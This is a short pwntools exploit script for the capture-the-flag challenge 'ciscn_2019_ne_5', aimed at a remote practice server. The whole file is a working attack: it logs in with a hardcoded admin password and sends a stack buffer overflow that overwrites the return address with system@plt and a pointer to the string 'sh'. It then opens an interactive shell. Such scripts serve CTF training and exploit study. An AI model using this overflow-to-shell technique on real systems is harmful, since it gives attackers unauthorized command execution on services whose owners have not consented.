from pwn import *


# p = process("./ciscn_2019_ne_5")
p = remote("node4.buuoj.cn", 29675)
pro = ELF("./ciscn_2019_ne_5")

system = pro.plt["system"]
sh = next(pro.search(b"sh\x00"))


p.recvuntil("Please input admin password:")
p.sendline("administrator")

p.recvuntil("0.Exit\n:")
p.sendline("1")
pad = cyclic(0x48+0x4)
pad += p32(system)+p32(0xdeadbeef)+p32(sh)
p.sendline(pad)

# GetFlag
p.sendline("4")

p.interactive()


